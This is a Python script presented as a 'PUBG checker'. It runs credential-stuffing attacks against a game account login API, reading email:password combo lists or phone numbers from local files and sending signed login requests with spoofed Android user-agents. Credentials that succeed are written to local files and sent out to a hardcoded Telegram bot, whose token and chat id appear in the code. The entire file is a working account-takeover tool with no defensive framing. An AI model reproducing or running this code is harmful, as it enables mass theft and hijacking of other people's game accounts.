import requests
import random
import string
import hashlib
print("""
  ___                            ___  
 (o o)                          (o o) 
(  V  ) PUBG checker by Mohsen (  V  )
--m-m----------------------------m-m--                                                                                    
===============================
✅ YouTube   ➡️ : Mohsen Al-Taie 
✅ Instagram ➡️ : zico.hip
✅ Telegram. ➡️ : @MohsenAlTaie
===============================
""")
d = 'y'
if d == 'y':
    token = "1996090719:AAGa0JaQrFsdFUIdyExFRMHIXJxxGWXHJec"
    id = 1557685494
    
Att = 0
Err = 0
ask = "1"
if ask == "2":
    print("{=} Check ComboList Started has Done !! \n")
    for i in open('Combo.txt','r').read().splitlines():
        i.strip()
        email = i.split(':')[0]
        password = i.split(':')[1]
        m = hashlib.md5(password.encode())
        pp = m.hexdigest()
        hach = (f"/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{{\"account\":\"{email}\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"{pp}\"}}3ec8cd69d71b7922e2a17445840866b26d86e283")
        h = hashlib.md5(hach.encode())
        sig = h.hexdigest()
        url = f'https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=' + sig
        data = "{\"account\":\"" + email + "\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"" + pp + "\"}"
        Random = str("".join(random.choice(string.digits)for i in range(7)))
        headers = {
            "Host": "igame.msdkpass.com",
            "Content-Type": "application/json; charset=utf-8",
            "Connection": "close",
            "Accept": "*/*",
            "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.{Random}",
            "Accept-Language": "ar-US;q=1, en-US;q=0.9",
            "Accept-Encoding": "gzip",
            "Content-Length": "126"
        }
        req = requests.post(url,data=data, headers=headers).text
        if 'token' in req:
            Att += 1
            if d == 'y':
                Send = requests.get(f'https://api.telegram.org/bot{token}/SendMessage?chat_id={id}&text=Succeeded✅\n=======================\n[=] Email : {email}\n[=] Pass : {password}\n=======================\nby : @zi_c0').text
                
            print(f'\r[-] Hits ✅ {Att} / [-] Error ❌ {Err}', end='')
            
            with open("MOHSEN.TXT", "a") as Save:
                Save.write(f'\MOHSEN\n=======================\n[=] Email : {email}\n[=] Pass : {password}\n=======================\nby : @zi_c0\n')
            
        else:
            Err += 1
            print(f'\r[-] Hits ✅ {Att} / [-] Error ❌ {Err}', end='')
    input()
elif ask =="1":
    print("{=} Check Numbers Started has Done !!\n")
    for i in open('Numbers.txt','r').read().splitlines():
        num = i
        i.strip()
        m = hashlib.md5(num.encode())
        pp = m.hexdigest()
        hach = (f"/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{{\"account\":\"{num}\",\"account_type\":0,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"{num}\"}}3ec8cd69d71b7922e2a17445840866b26d86e283")
        h = hashlib.md5(hach.encode())
        sig = h.hexdigest()
        url = f'https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=' + sig
        data = "{\"account\":\"" + num + "\",\"account_type\":0,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"" + num + "\"}"
        Random = str("".join(random.choice(string.digits)for i in range(7)))
        headers = {
            "Host": "igame.msdkpass.com",
            "Content-Type": "application/json; charset=utf-8",
            "Connection": "close",
            "Accept": "*/*",
            "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.{Random}",
            "Accept-Language": "ar-US;q=1, en-US;q=0.9",
            "Accept-Encoding": "gzip",
            "Content-Length": "126"
        }
        req = requests.post(url,data=data, headers=headers).text
        if 'token' in req:
            Att += 1
            if d == "y":
                Send = requests.get(f'https://api.telegram.org/bot{token}/SendMessage?chat_id={id}&text=Succeeded✅\n=======================\n[=] Email : {num}\n[=] Pass : {num}\n=======================\nby : @zi_c0').text
            print(f'\r[-] Hits ✅ {Att} / [-] Error ❌ {Err}', end='')
            with open("Accounts Hit.txt", "a") as Save:
                Save.write(f'{num}:{num}\n')
            
        else:
            Err += 1
            print(f'\r[-] Hits ✅ {Att} / [-] Error ❌ {Err}', end='')
